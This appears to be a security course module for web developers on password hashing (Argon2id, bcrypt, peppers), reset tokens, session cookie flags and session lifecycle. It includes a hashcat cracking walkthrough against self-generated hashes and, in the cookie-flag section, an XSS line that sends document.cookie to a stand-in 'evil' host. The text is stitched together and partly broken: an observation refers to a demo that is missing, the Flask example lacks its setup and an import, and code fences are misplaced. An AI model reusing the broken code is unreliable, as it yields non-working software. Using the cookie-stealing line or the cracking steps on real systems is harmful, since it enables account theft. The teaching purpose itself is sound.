    body: `> **Why this module is first.** Almost every breach you have ever read about ends with the same sentence: "and the password database was leaked." How you store passwords is the single decision that determines whether a database leak is a Tuesday-afternoon password-reset email or a company-ending, regulator-involving catastrophe. We start here because it is the highest-leverage thing a full-stack developer controls.

### 🎯 Concept: what a password actually is, and the problem it creates

A password is a **shared secret**: the user knows it, and your server needs some way to recognize it later. The naive full-stack instinct — the one almost every beginner has — is "store the password in a column and compare on login":

\`\`\`sql
-- the instinct everyone starts with
SELECT id FROM users WHERE email = $1 AND password = $2;
\`\`\`

This is catastrophic, and it is worth deriving *exactly why*, because the reasoning is the whole module.

**Naive solution #1 — store plaintext — fails because:** your database is not a vault. Backups get copied to laptops. Read replicas get exposed. A single SQL injection (Module 3.2) dumps the whole table. Insiders browse it. Logs accidentally capture it. The moment plaintext passwords exist *anywhere*, every one of those events leaks usable credentials. And because humans reuse passwords, leaking your DB also breaks into your users' email, bank, and employer. You are now liable for harm far beyond your own app.

So we need a way to verify a password **without storing the password itself.** That is what a hash function gives us.

**Hashing vs. encryption — define both precisely, because beginners constantly confuse them:**

- **Encryption** is *reversible*. You encrypt with a key; anyone with the key can decrypt back to the original. Encryption is the wrong tool for passwords, because if your server can decrypt the password to compare it, so can an attacker who steals the key. (And the key is almost always sitting right next to the data it protects.)
- **Hashing** is *one-way*. A hash function \`H\` takes input of any size and produces a fixed-size output (the "digest"). There is no \`H⁻¹\`. Given the digest you cannot compute the input — you can only *guess* an input, hash it, and check whether the digest matches.

So the plan becomes: store \`H(password)\`. On login, compute \`H(submitted_password)\` and compare digests. The server never stores anything that can be turned back into the password.

**Naive solution #2 — store \`SHA-256(password)\` — fails for two independent reasons:**

**Reason A — it is too fast.** SHA-256 was designed to be *fast* (it hashes files, verifies downloads, powers Bitcoin mining). A modern GPU computes **billions of SHA-256 hashes per second.** An attacker who steals your hash table doesn't need to reverse the hash — they just guess. They take a 14-billion-word leaked password list and hash every entry. At billions/sec, the entire list is exhausted in *seconds*. Every user who picked a human password is now cracked. The one-way property is irrelevant when guessing is free.

**Reason B — identical passwords produce identical hashes.** \`SHA-256("hunter2")\` is the same digest for every user who chose \`hunter2\`. So an attacker can: (1) see which users share a password (the hashes match) — instant signal of weak/common passwords; (2) build a **rainbow table**: a precomputed map of \`hash → password\` for billions of common passwords *once*, then look up your entire stolen table instantly with zero per-user work.

We fix Reason B with a **salt**, and Reason A with a **slow hash**.

**Salt — what it is and the exact attack it defeats.** A salt is a unique, random value (16+ bytes) generated *per user* and stored *alongside* the hash (it is not secret). You hash \`H(salt + password)\`. Now two users with the same password get different salts → different hashes (Reason B is dead), and a precomputed rainbow table is useless because it would have had to include your random salt — forcing the attacker to crack each user *individually*. The salt does **not** need to be secret; its entire job is to be *unique* so work can't be amortized across users.

**Pepper — the optional second secret.** A pepper is a *single* secret value, the same for all users, that is **not** stored in the database — it lives in your application config / a secrets manager / an HSM. You hash with both: \`H(salt + pepper + password)\`. The point: if an attacker steals only the *database* (SQL injection, leaked backup) but not your *app secrets*, they cannot crack anything, because they're missing the pepper. The clean way to apply it with Argon2/bcrypt is to HMAC the password with the pepper key *before* feeding it to the password hash (see code below).

**Slow hashes — the real fix for Reason A.** We use a hash *deliberately engineered to be slow and resource-hungry*, with a tunable **work factor** you crank up as hardware improves:

| Algorithm | Year | Resistant to | Notes |
|---|---|---|---|
| **bcrypt** | 1999 | GPU brute force (slow, salted) | Battle-tested, everywhere. **72-byte input limit.** Cost factor doubles work each +1. |
| **scrypt** | 2009 | GPU + custom-hardware (memory-hard) | Adds a memory cost so attackers can't just buy parallel cores cheaply. |
| **Argon2id** | 2015 | GPU + ASIC + side-channel | Winner of the Password Hashing Competition. **The current default (OWASP).** Tunable on three axes. |

**Argon2id deep-dive.** Argon2 comes in three variants: **Argon2d** maximizes GPU-crack resistance but is vulnerable to side-channel timing attacks; **Argon2i** resists side channels but is slightly weaker against GPU cracking; **Argon2id** is the *hybrid* — an Argon2i pass then an Argon2d pass, giving you both. This is why OWASP says use **Argon2id specifically**, not bare "Argon2".

Argon2id is **memory-hard**, the conceptual leap. bcrypt costs an attacker CPU time; Argon2id costs an attacker *memory* — each hash must allocate ~19 MB of RAM and randomly walk through it. An attacker's advantage normally comes from massive parallelism (thousands of GPU cores), but you cannot cheaply give 5,000 cores 19 MB each — memory becomes the bottleneck. Memory-hardness attacks the *economics* of large-scale cracking.

Argon2id has three tuning knobs: **\`memoryCost\` (m)** — KiB of RAM per hash, OWASP baseline **19456 KiB (19 MiB)**; **\`timeCost\` (t)** — iterations over memory, baseline **2**; **\`parallelism\` (p)** — lanes/threads, baseline **1** for server use. The rule of thumb: **pick parameters so a single hash takes ~250–500ms on production hardware** — imperceptible to a logging-in human, but it multiplies an offline attacker's cost by millions versus SHA-256.

### ⚔️ Attack Demo: crack a fast hash, then watch a slow hash defeat you

> **Ethics & scope (read every time).** Everything below runs against **passwords you invent, on your own laptop, against hash files you generate yourself.** You are attacking your own data to feel the difference in cracking speed. Do not point these tools at any account, hash, or system you do not own. Cracking someone else's hashes is a crime in most jurisdictions even if you "found" them.

**M2 / Apple Silicon setup (all ARM64-native via Homebrew, no Rosetta):**

\`\`\`bash
brew install hashcat        # GPU/CPU password cracker — native arm64
brew install john-jumbo     # john the ripper (community jumbo build), native arm64
# a tiny wordlist to crack against:
curl -L -o ~/rockyou-sample.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt
\`\`\`

**Step 1 — generate your own victim hashes (fast hash, the wrong way).** Three users with deliberately weak passwords stored as bare SHA-256:

\`\`\`bash
node -e '
const crypto = require("crypto");
const users = { alice: "password1", bob: "iloveyou", carol: "sunshine" };
for (const [u, p] of Object.entries(users)) {
  const h = crypto.createHash("sha256").update(p).digest("hex");
  console.log(\`\${u}:\${h}\`);
}' > ~/fasthashes.txt
cat ~/fasthashes.txt
\`\`\`

**Step 2 — crack them.** Mode \`1400\` is raw SHA-256; \`--username\` tells hashcat the file is \`user:hash\`:

\`\`\`bash
hashcat -m 1400 -a 0 --username ~/fasthashes.txt ~/rockyou-sample.txt
hashcat -m 1400 --username ~/fasthashes.txt --show
\`\`\`

**Expected observation.** On the M2 Pro's CPU this finishes essentially instantly — all three fall in well under a second, at a hash rate in the *millions to hundreds-of-millions per second* range. **This is the entire point:** a fast hash means the attacker's only limit is the size of their wordlist, and wordlists are free. Bare SHA-256 is a speed bump made of tissue paper.

**Step 3 — now generate the same passwords as Argon2id and feel the difference.**

\`\`\`bash
npm install argon2          # native arm64 prebuilt binary, no compile on M2
node -e '
const argon2 = require("argon2");
(async () => {
  for (const p of ["password1","iloveyou","sunshine"]) {
    const h = await argon2.hash(p, { type: argon2.argon2id, memoryCost: 19456, timeCost: 2, parallelism: 1 });
    console.log(h);
  }
})();'
\`\`\`

Each line is a long string like \`$argon2id$v=19$m=19456,t=2,p=1$<salt>$<digest>\`. That string is **self-describing**: it embeds the algorithm, the parameters, the per-user salt, and the digest. You store that one string; on login you hand it and the submitted password to \`argon2.verify\` and it reads the parameters back out. (bcrypt's \`$2b$...\` strings work the same way — this is why you never store the salt in a separate column.)

**Step 4 — try to crack the Argon2id hashes.** hashcat mode \`34000\` is Argon2:

\`\`\`bash
hashcat -m 34000 -a 0 ~/argonhash.txt ~/rockyou-sample.txt
\`\`\`

**Expected observation.** The hash rate collapses from millions/sec to a *handful per second* on the same hardware, and each guess now eats ~19 MB of RAM. The wordlist that fell in milliseconds against SHA-256 now takes an impractical amount of time, and parallelizing is throttled by memory, not cores. **You have personally measured why "slow + memory-hard" is the whole game.**

### 🛡️ Defense: the rules, and the reasoning behind each

**Root-cause principle:** *never store anything that can be turned back into the password, and make every guess as expensive as you can tolerate.*

1. **Never store plaintext. Never encrypt. Always hash with a purpose-built password hash.**
2. **Use Argon2id** (first choice) **or bcrypt** (fine, mature). Never MD5, SHA-1, SHA-256/512, or any general-purpose hash *by itself* for passwords.
3. **Let the library handle the salt.** Argon2 and bcrypt generate a CSPRNG per-user salt and embed it in the output string. You don't manage salts manually.
4. **Tune the work factor to ~250–500ms on prod hardware**, and revisit yearly — hardware gets faster, so your cost factor should creep up.
5. **Consider a pepper** stored in a secrets manager (not the DB) for defense-in-depth against database-only leaks.
6. **Constant-time comparison.** Comparing digests with \`==\` can leak timing (it returns early on the first differing byte). argon2/bcrypt verify functions compare in constant time — use them; never hand-roll \`hashA === hashB\` on raw digests.
7. **Check passwords against breach lists** at signup (Have I Been Pwned's k-anonymity range API checks without sending the password). Reject known-breached passwords — this stops credential stuffing at the door.
8. **Defense-in-depth beyond storage:** rate-limit login attempts, add MFA/passkeys (Module 6.6), detect credential-stuffing patterns.

**Common pitfalls and false-confidence traps:**

- **"I used SHA-256 *with* a salt, so I'm fine."** No — salting fixes the rainbow-table problem (Reason B) but does *nothing* about speed (Reason A). You need slow *and* salted.
- **The bcrypt 72-byte trap.** bcrypt silently *ignores everything past 72 bytes*. Two different long passwords can collide on their first 72 bytes, and prepending a pepper eats into the budget. The safe pattern is \`bcrypt(base64(HMAC-SHA256(pepper, password)))\` — the HMAC produces a fixed 32-byte digest that fits comfortably under 72 bytes.
- **Null-byte truncation.** Some old bcrypt implementations truncate at the first \\0. Use a current library — and don't roll your own.
- **Storing the work factor separately and forgetting to upgrade.** Because the cost is embedded in the hash string, you can *transparently upgrade*: on a successful login, if the stored hash used old parameters, re-hash the (now known-correct) plaintext with current parameters and save it.
- **Logging the password.** Passwords and reset tokens must be scrubbed from logs, error trackers (Sentry), and APM traces.

\`\`\`javascript
// ✅ SECURE — Argon2id, per-user salt (library-managed), optional pepper,
//             constant-time verify, transparent parameter upgrade.
const argon2 = require('argon2');
const crypto = require('crypto');

// Pepper lives in env / secrets manager, NOT in the database.
const PEPPER = process.env.PASSWORD_PEPPER; // e.g. a 32-byte base64 secret

// WHY: HMAC the password with the pepper FIRST. This (a) applies the pepper as a
// real secret, and (b) produces a fixed 32-byte digest so we never trip the
// bcrypt 72-byte limit if we ever switch hashes. Output is base64 (printable).
function withPepper(password) {
  return crypto.createHmac('sha256', PEPPER).update(password).digest('base64');
}

// Current OWASP-baseline parameters. Bump these as hardware improves.
const ARGON_OPTS = { type: argon2.argon2id, memoryCost: 19456, timeCost: 2, parallelism: 1 };

async function register(db, email, password) {
  // WHY RIGHT: argon2.hash auto-generates a CSPRNG salt and embeds algorithm +
  // params + salt + digest in one self-describing string. Slow + memory-hard =
  // offline cracking is economically infeasible even if the DB leaks.
  const hash = await argon2.hash(withPepper(password), ARGON_OPTS);
  await db.query('INSERT INTO users(email, password_hash) VALUES ($1,$2)', [email, hash]);
}

async function login(db, email, password) {
  const { rows } = await db.query('SELECT id, password_hash FROM users WHERE email=$1', [email]);
  // WHY: do the (expensive) verify EVEN when no user exists, against a dummy hash,
  // so response time doesn't reveal whether an account exists (user enumeration).
  const stored = rows[0]?.password_hash
    ?? '$argon2id$v=19$m=19456,t=2,p=1$ZGVjb3lkZWNveQ$3hQ5...decoy...';

  // WHY RIGHT: argon2.verify reads the params/salt back out of the stored string
  // and compares in CONSTANT TIME — no early-exit timing leak.
  const ok = await argon2.verify(stored, withPepper(password));
  if (!ok || !rows[0]) return null;

  // Transparent upgrade: if this hash used weaker params, re-hash now that we
  // hold the correct plaintext, migrating the user to current strength silently.
  if (argon2.needsRehash(stored, ARGON_OPTS)) {
    const fresh = await argon2.hash(withPepper(password), ARGON_OPTS);
    await db.query('UPDATE users SET password_hash=$1 WHERE id=$2', [fresh, rows[0].id]);
  }
  return rows[0].id;
}

### Password reset flows — the most-abused "forgot password" link

A password reset is a **second authentication path**, often weaker than the login it bypasses. Reason from first principles: you are about to let someone change a password *without knowing the old one*, so the reset token effectively **is** the account for its lifetime. Treat it like a temporary password.

**Naive reset shortcuts and why each breaks:** *"email a 6-digit code"* — a million possibilities, brute-forced in minutes without a rate limit; *"put the user's ID in the reset URL"* — anyone resets anyone by changing the ID (IDOR); *"reuse the token until used"* — long-lived tokens sit in email/logs/history; *"store the token in plaintext"* — a DB leak hands the attacker live reset tokens, so **hash the token in the DB** exactly like a password.

**The secure reset flow, step by step:** (1) user submits an email — **always respond identically** ("if that account exists, we sent a link") to avoid a user-enumeration oracle; (2) generate a **cryptographically random** token \`crypto.randomBytes(32)\` (256 bits), email the *plaintext*, store only \`SHA-256(token)\` with a short expiry and \`used=false\`, bound to the user id; (3) on click, look up by \`SHA-256(token)\`, check unexpired and unused; (4) on reset: hash the new password (Argon2id), **mark the token used (single-use)**, **invalidate all existing sessions**, and **notify the user by email**.

\`\`\`javascript
// ✅ SECURE password reset — request + confirm
const crypto = require('crypto');

async function requestReset(db, mailer, email) {
  const { rows } = await db.query('SELECT id FROM users WHERE email=$1', [email]);
  // WHY: respond the same way regardless, to avoid leaking who has an account.
  if (rows[0]) {
    const token = crypto.randomBytes(32).toString('hex');          // 256-bit, unguessable
    const tokenHash = crypto.createHash('sha256').update(token).digest('hex'); // store the HASH
    const expires = new Date(Date.now() + 30 * 60 * 1000);          // 30-minute TTL
    await db.query(
      \`INSERT INTO password_resets(user_id, token_hash, expires_at, used)
       VALUES ($1,$2,$3,false)\`, [rows[0].id, tokenHash, expires]);
    // email the PLAINTEXT token; the DB only ever holds its hash
    await mailer.send(email, \`https://example.com/reset?token=\${token}\`);
  }
  return { message: 'If that account exists, a reset link has been sent.' };
}

async function confirmReset(db, token, newPassword) {
  const tokenHash = crypto.createHash('sha256').update(token).digest('hex');
  const { rows } = await db.query(
    \`SELECT user_id FROM password_resets
      WHERE token_hash=$1 AND used=false AND expires_at > now()\`, [tokenHash]);
  if (!rows[0]) throw new Error('Invalid or expired token'); // covers wrong/old/used tokens
  const userId = rows[0].user_id;

  const hash = await argon2.hash(withPepper(newPassword), ARGON_OPTS);
  await db.query('UPDATE users SET password_hash=$1 WHERE id=$2', [hash, userId]);
  await db.query('UPDATE password_resets SET used=true WHERE token_hash=$1', [tokenHash]); // single-use
  await db.query('DELETE FROM sessions WHERE user_id=$1', [userId]);                       // kill all sessions
  // (notify the user by email that their password changed)
}
\`\`\`

\`\`\`python
# ✅ SECURE — Argon2id, library-managed salt, optional pepper, constant-time
#             verify, transparent parameter upgrade.
import os, hmac, hashlib, base64
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError

PEPPER = os.environ["PASSWORD_PEPPER"].encode()  # in env / secrets manager, NOT the DB

def with_pepper(password: str) -> str:
    # HMAC the password with the pepper FIRST: applies the pepper as a real secret
    # and yields a fixed 32-byte digest so we never trip a downstream length limit.
    mac = hmac.new(PEPPER, password.encode(), hashlib.sha256).digest()
    return base64.b64encode(mac).decode()

# argon2-cffi defaults to Argon2id; set the cost factors explicitly (OWASP baseline).
ph = PasswordHasher(memory_cost=19456, time_cost=2, parallelism=1)
# A decoy hash so a missing user still costs a full verify (no timing leak).
DUMMY_HASH = ph.hash(with_pepper("decoy-never-matches"))

def register(conn, email, password):
    digest = ph.hash(with_pepper(password))  # CSPRNG salt + params embedded
    with conn.cursor() as cur:
        cur.execute("INSERT INTO users(email, password_hash) VALUES (%s, %s)",
                    (email, digest))

def login(conn, email, password):
    with conn.cursor() as cur:
        cur.execute("SELECT id, password_hash FROM users WHERE email=%s", (email,))
        row = cur.fetchone()
    stored = row[1] if row else DUMMY_HASH   # verify even when no user → constant time
    try:
        ph.verify(stored, with_pepper(password))   # constant-time, raises on mismatch
    except VerifyMismatchError:
        return None
    if not row:
        return None  # verify "passed" only because there was no real user

    if ph.check_needs_rehash(stored):    # transparent upgrade to current params
        fresh = ph.hash(with_pepper(password))
        with conn.cursor() as cur:
            cur.execute("UPDATE users SET password_hash=%s WHERE id=%s", (fresh, row[0]))
    return row[0]
\`\`\`

# ✅ SECURE password reset — request + confirm
import os, hashlib
from datetime import datetime, timedelta, timezone

def request_reset(conn, mailer, email):
    with conn.cursor() as cur:
        cur.execute("SELECT id FROM users WHERE email=%s", (email,))
        row = cur.fetchone()
    if row:  # respond the same way regardless, to avoid leaking who has an account
        token = os.urandom(32).hex()                                   # 256-bit, unguessable
        token_hash = hashlib.sha256(token.encode()).hexdigest()        # store the HASH
        expires = datetime.now(timezone.utc) + timedelta(minutes=30)   # 30-minute TTL
        with conn.cursor() as cur:
            cur.execute(
                """INSERT INTO password_resets(user_id, token_hash, expires_at, used)
                   VALUES (%s, %s, %s, false)""", (row[0], token_hash, expires))
        mailer.send(email, f"https://example.com/reset?token={token}")  # email plaintext token
    return {"message": "If that account exists, a reset link has been sent."}

def confirm_reset(conn, token, new_password):
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    with conn.cursor() as cur:
        cur.execute(
            """SELECT user_id FROM password_resets
                WHERE token_hash=%s AND used=false AND expires_at > now()""",
            (token_hash,))
        row = cur.fetchone()
    if not row:
        raise ValueError("Invalid or expired token")  # wrong/old/used tokens
    user_id = row[0]

    digest = ph.hash(with_pepper(new_password))
    with conn.cursor() as cur:
        cur.execute("UPDATE users SET password_hash=%s WHERE id=%s", (digest, user_id))
        cur.execute("UPDATE password_resets SET used=true WHERE token_hash=%s", (token_hash,))  # single-use
        cur.execute("DELETE FROM sessions WHERE user_id=%s", (user_id,))                        # kill all sessions
    # (notify the user by email that their password changed)

<details>
<summary>Show answers</summary>

1. Plaintext fails because a DB leak hands over live credentials directly. \`SHA-256(password)\` fails because the hash is fast enough to brute-force a whole wordlist in seconds and identical passwords share a hash. \`SHA-256(salt+password)\` still fails because the salt only stops rainbow tables/hash-sharing — it does nothing about *speed*, so per-user wordlist cracking still works.
2. A salt defeats precomputed rainbow tables and hides which users share a password (forcing per-user work). It does NOT defeat brute-forcing a fast hash, since the salt is stored alongside the hash.
3. A pepper protects against a *database-only* leak (SQL injection, stolen backup): without the separately-stored pepper the attacker can't crack anything. It must live in app config / a secrets manager / an HSM — never in the database.
4. Argon2id is a hybrid (Argon2i pass then Argon2d) giving both side-channel and GPU-crack resistance; Argon2d alone leaks via timing side-channels and Argon2i alone is weaker against GPU cracking.
5. Memory-hardness forces each hash to allocate and randomly traverse a large block of RAM. Attackers win through massive parallelism (thousands of cores), but you can't cheaply give every core enough memory — memory becomes the bottleneck, attacking the *economics* of mass cracking.
6. bcrypt ignores input beyond 72 bytes (and historically truncated at a null byte). Apply the pepper by computing a fixed-length \`base64(HMAC-SHA256(pepper, password))\` first, then bcrypt that — it stays well under 72 bytes and applies the pepper as a true secret.
7. (a) Random/unguessable — else brute-forced or IDOR'd; (b) hashed in the DB — else a leak yields live tokens; (c) short expiry — else a stale token in email/logs stays usable; (d) single-use + invalidates sessions on use — else the token (or an attacker's existing session) keeps working after reset.
</details>

### 🎯 Concept: why sessions exist at all

HTTP is **stateless**. Every request arrives with no memory of the one before it — the server has no built-in way to know that the request asking for \`/dashboard\` came from the same person who just typed a password into \`/login\`. If we did nothing, the user would re-send their password on *every single request* — terrible UX and a security nightmare (the password flying across the wire constantly, sitting in logs).

So after a successful login we issue a **session**: state that says "this requester has already proven who they are." The mechanism is a **session identifier** — a long random string — that the browser sends back on every subsequent request. The naive instinct is "just send the user's id":

**Naive solution #1 — cookie holds the user id (\`uid=42\`) — fails because** the user can edit their own cookie. Set \`uid=1\` and you're the admin. The session identifier must be **unforgeable** — either a long random value the server looks up, or a cryptographically *signed* value the server can verify but the client cannot tamper with.

**Naive solution #2 — session id in a URL or a JS-managed header — fails because** URLs leak into browser history, server logs, \`Referer\` headers, and shared links; and if JavaScript can read the token, a single XSS bug (Module 2.2) steals it. This is exactly why the browser's **cookie** mechanism exists, and why specific cookie *flags* matter so much.

**What a cookie is, precisely.** A cookie is a small key=value pair the server sets via the \`Set-Cookie\` response header; the browser then **automatically attaches it to every future request to that domain**, with no JavaScript involved. That automatic attachment is the cookie's superpower (seamless sessions) and its curse (it's the root cause of CSRF — Module 2.3 — because the browser attaches the cookie even on requests *triggered by a malicious site*).

**Two session architectures — know the trade-off:**

- **Server-side (stateful) sessions:** the cookie holds only an opaque random id; the *actual* session data lives in a server store (Redis, Postgres). **Pro:** instant revocation — delete the row and the session is dead everywhere. **Con:** the server must store and look up state.
- **Client-side (stateless) sessions / JWTs:** the cookie *is* the data, cryptographically signed (Module 6.3). **Pro:** no server lookup. **Con:** you cannot easily revoke it before it expires. This revocation problem is the central tension of Module 6.3.

For most full-stack apps, **server-side sessions are the safer default** precisely because revocation is free — which is why password reset, logout-everywhere, and "you've been signed out for security" all just work.

### Cookie flags — each one defined, with the exact attack it stops

- **\`HttpOnly\`** — the cookie is invisible to JavaScript (\`document.cookie\` can't read it). **Stops:** XSS-based session theft. Without it, any XSS payload exfiltrates the session with \`fetch('//evil/?c='+document.cookie)\`. (XSS can still *act* as the user in-page — \`HttpOnly\` is not an XSS cure, it protects the cookie's confidentiality.)
- **\`Secure\`** — the cookie is only ever sent over HTTPS. **Stops:** network sniffing / downgrade. Without it, one plain-\`http://\` request (a typo'd link, an image, a captive-portal redirect) leaks the session over the wire.
- **\`SameSite\`** — controls whether the cookie is attached on *cross-site* requests. The direct anti-CSRF lever:
  - \`Strict\` — never sent on any cross-site request. Maximum CSRF protection, but breaks "click a link in an email and land logged in."
  - \`Lax\` (the modern default) — sent on top-level **navigations** (clicking a link) but **not** on cross-site \`POST\`s, \`fetch\`, or iframes. Kills classic form-POST CSRF while keeping links working. **Does NOT stop:** XSS (same-origin), or state-changing top-level GET navigations (which are themselves a bug).
  - \`None\` — sent on all cross-site requests; **requires \`Secure\`**. Only for genuinely cross-site needs (embedded widgets, some SSO).
- **\`Path\` / \`Domain\`** — scope *which* URLs the cookie attaches to. Keep them tight. A \`Domain=.example.com\` cookie is shared with *every* subdomain — so a compromised \`coupons.example.com\` can read or set your session cookie. Default to host-only cookies.

Plus two structural rules:
- **\`__Host-\` prefix.** Naming the cookie \`__Host-session\` makes the browser *enforce* that it is \`Secure\`, \`Path=/\`, and has **no** \`Domain\` (host-only). A guardrail against subdomain-scoped cookie injection. Use it for session cookies.
- **Cookie size.** Keep session cookies to the opaque id only; don't stuff data in them.

### Session lifecycle rules — and the attacks behind each

- **Rotate (regenerate) the session id on login.** *Why:* defeats **session fixation** — an attacker who plants a known session id in your browser *before* you log in would otherwise hold a valid authenticated session afterward. Regenerating the id at the privilege change makes their planted id worthless.
- **Invalidate sessions on password reset / change.** *Why:* if an account was taken over, resetting the password must also kick the attacker out — otherwise their live session survives the very reset meant to evict them. (The \`DELETE FROM sessions\` line in Module 6.1's reset flow.)
- **Idle timeout + absolute timeout.** *Idle* (e.g. 30 min inactivity) limits exposure of an abandoned session; *absolute* (e.g. 12–24h regardless of activity) caps total lifetime so a stolen-but-active session can't live forever. You need both.
- **Server-side state for revocation.** "Log out everywhere," admin-forced logout, and reacting to a breach all require killing a session on demand — which only stateful sessions give you cheaply.

\`\`\`

**Expected observation.** You see the bearer token printed — now exfiltratable by any injected script. **The lesson is visceral:** had this been an \`HttpOnly\` cookie, that line would have returned \`null\`. This is the single most important reason session material belongs in \`HttpOnly\` cookies, not \`localStorage\`.

**Demo B — session fixation, conceptually.** Build a 20-line Express app that does *not* regenerate the session on login, set a known \`connect.sid\` cookie in your browser via DevTools, then log in. Inspect the cookie afterward: the id is unchanged — an attacker who planted that id now shares your authenticated session. Add \`req.session.regenerate()\` on login and repeat — the id changes, the planted id is dead. (Code in the secure example below.)

### 🛡️ Defense

**Root-cause principle:** the session id must be *unforgeable*, *unreadable by JS*, *unsendable cross-site*, *rotated at privilege boundaries*, and *revocable on demand.* Each cookie flag and lifecycle rule above maps to exactly one of those.

**Defense-in-depth layers:** \`HttpOnly\`+\`Secure\`+\`SameSite\` cookie → \`__Host-\` prefix → server-side store for revocation → rotate on login → idle+absolute timeouts → invalidate on reset → re-auth (step-up) before sensitive actions.

**Pitfalls and false-confidence traps:**
- **"\`SameSite=Lax\` means I don't need CSRF tokens."** Lax covers most cases, but state-changing GETs, some legacy browsers, and \`SameSite=None\` widgets still need anti-CSRF tokens. Keep CSRF tokens for sensitive POSTs.
- **"I set \`HttpOnly\`, so XSS can't hurt my session."** XSS can still *make requests as the user* using the auto-attached cookie. \`HttpOnly\` protects secrecy, not session integrity. Fix the XSS.
- **Subdomain cookie leakage.** A \`Domain=.example.com\` session cookie is exposed to every subdomain. Use host-only (\`__Host-\`) cookies.
- **Forgetting \`Secure\` in dev → prod.** Gate it on \`NODE_ENV === 'production'\` and verify in prod.

// ✅ SECURE session setup (server-side store + hardened cookie)
const session = require('express-session');
const RedisStore = require('connect-redis').default;
const { createClient } = require('redis');
const redis = createClient(); redis.connect();

app.set('trust proxy', 1); // so Secure cookies work behind a TLS-terminating proxy

app.use(session({
  store: new RedisStore({ client: redis }),   // WHY: server-side store => instant revocation
  name: '__Host-sid',                          // WHY: __Host- forces Secure + Path=/ + host-only
  secret: process.env.SESSION_SECRET,          // WHY: strong secret from env, rotatable
  resave: false, saveUninitialized: false,     // WHY: don't create empty sessions / needless writes
  cookie: {
    httpOnly: true,                            // WHY: JS (and XSS) can't read the cookie
    secure: process.env.NODE_ENV === 'production', // WHY: HTTPS-only in prod
    sameSite: 'lax',                           // WHY: blocks classic cross-site CSRF POSTs
    path: '/',
    maxAge: 1000 * 60 * 60 * 12,               // WHY: 12h absolute cap
  },
}));

app.post('/login', async (req, res, next) => {
  const user = await checkPassword(req.body);
  if (!user) return res.status(401).json({ ok: false });
  // WHY: regenerate() issues a NEW id at the privilege boundary => kills session fixation.
  req.session.regenerate((err) => {
    if (err) return next(err);
    req.session.userId = user.id;
    req.session.createdAt = Date.now();        // for absolute-timeout checks
    req.session.lastSeen = Date.now();         // for idle-timeout checks
    res.json({ ok: true });
  });
});

// Idle-timeout middleware: kill sessions inactive > 30 min.
app.use((req, res, next) => {
  if (req.session.userId) {
    if (Date.now() - req.session.lastSeen > 30 * 60 * 1000) {
      return req.session.destroy(() => res.status(401).json({ error: 'session expired' }));
    }
    req.session.lastSeen = Date.now();
  }
  next();
});

// Logout / logout-everywhere both just destroy server-side state:
app.post('/logout', (req, res) => req.session.destroy(() => res.json({ ok: true })));

from flask import Flask, session, request, jsonify
from flask_session import Session
import redis, os, time

    SESSION_TYPE="redis",                         # server-side store => instant revocation
    SESSION_REDIS=redis.from_url(os.environ.get("REDIS_URL", "redis://localhost:6379")),

    SESSION_COOKIE_NAME="__Host-sid",
    SESSION_COOKIE_HTTPONLY=True,                 # JS (and XSS) can't read the cookie
    SESSION_COOKIE_SECURE=True,                   # HTTPS-only (required by __Host-)
    SESSION_COOKIE_SAMESITE="Lax",                # blocks classic cross-site CSRF POSTs
    PERMANENT_SESSION_LIFETIME=timedelta(hours=12),  # 12h absolute cap
)
Session(app)

IDLE_TIMEOUT = 30 * 60  # seconds

@app.post("/login")
def login():
    user = check_password(request.form)
    if not user:
        return jsonify(ok=False), 401
    # WHY: clearing first issues a NEW server-side session id at the privilege
    # boundary => kills session fixation (a fresh id is written on next set).
    session.clear()
    session["user_id"] = user["id"]
    session["created_at"] = time.time()   # for absolute-timeout checks
    session["last_seen"] = time.time()    # for idle-timeout checks
    session.permanent = True              # apply PERMANENT_SESSION_LIFETIME cap
    return jsonify(ok=True)

@app.before_request
def enforce_idle_timeout():
    if "user_id" in session:
        if time.time() - session.get("last_seen", 0) > IDLE_TIMEOUT:
            session.clear()
            return jsonify(error="session expired"), 401
        session["last_seen"] = time.time()

@app.post("/logout")
def logout():
    session.clear()
    return jsonify(ok=True)
\`\`\`

> **Why \`session.clear()\` and not just overwriting keys?** With a server-side store, the property you want at login is *a new, attacker-unknown session id*. Flask-Session rotates the id when the session is emptied and repopulated, so \`clear()\` then set is the Pythonic equivalent of Express's \`req.session.regenerate()\`. The default signed-cookie session (no server store) is **not revocable** — a stolen cookie is valid until it expires, which is exactly why production auth wants the Redis-backed store.

### Knowledge check: Sessions and Cookies

1. HTTP is stateless — what problem does that create, and how does a session cookie solve it without re-sending the password?
2. Why is storing the session token in \`localStorage\` worse than in an \`HttpOnly\` cookie? What can XSS still do even with \`HttpOnly\`?
3. Explain \`SameSite=Lax\` vs \`Strict\` and exactly which CSRF cases each covers.
4. What does the \`__Host-\` cookie prefix enforce, and what attack does it prevent?
5. What is session fixation, and which single line of code defeats it?
6. Why do you need *both* idle and absolute timeouts?
7. Why are server-side sessions easier to revoke than stateless JWTs?

<details>
<summary>Show answers</summary>

1. Statelessness means the server can't tell two requests came from the same authenticated user; without sessions the user would re-send their password every request. A session cookie carries an unforgeable id the browser auto-attaches, so the server recognizes the user after one login.
2. \`localStorage\` is readable by any JavaScript, so a single XSS steals the token; an \`HttpOnly\` cookie is invisible to JS. With \`HttpOnly\`, XSS still can't *read* the cookie but can still send authenticated requests in-page using the auto-attached cookie — so you must still fix the XSS.
3. \`Strict\` never sends the cookie cross-site (max CSRF protection, breaks inbound links); \`Lax\` sends it on top-level navigations but not cross-site POST/fetch/iframe, stopping classic form-POST CSRF while keeping links working. Neither stops same-origin XSS.
4. \`__Host-\` forces the cookie to be \`Secure\`, \`Path=/\`, and host-only (no \`Domain\`), preventing a subdomain from setting/reading your session cookie.
5. Session fixation is when an attacker plants a known session id before you log in and inherits your authenticated session afterward. \`req.session.regenerate()\` on login issues a fresh id, voiding the planted one.
6. Idle timeout limits exposure of an inactive session; absolute timeout caps total lifetime so an actively-kept-alive stolen session can't live indefinitely. Either alone leaves a gap.
7. A server-side session is a row you delete to instantly kill it everywhere; a signed stateless JWT stays valid until it expires regardless, so revoking it early needs extra machinery (blocklists, short TTLs + refresh).
</details>

### 🎯 Concept: what a JWT is and the exact problem it solves

A **JWT (JSON Web Token, "jot")** carries *signed* data so the receiver can trust it came from a key-holder — *without* a database lookup. It is the standard tool for **stateless** sessions (Module 6.2's second architecture) and for passing identity *between services* (the auth server issues a token; ten microservices each verify it independently).

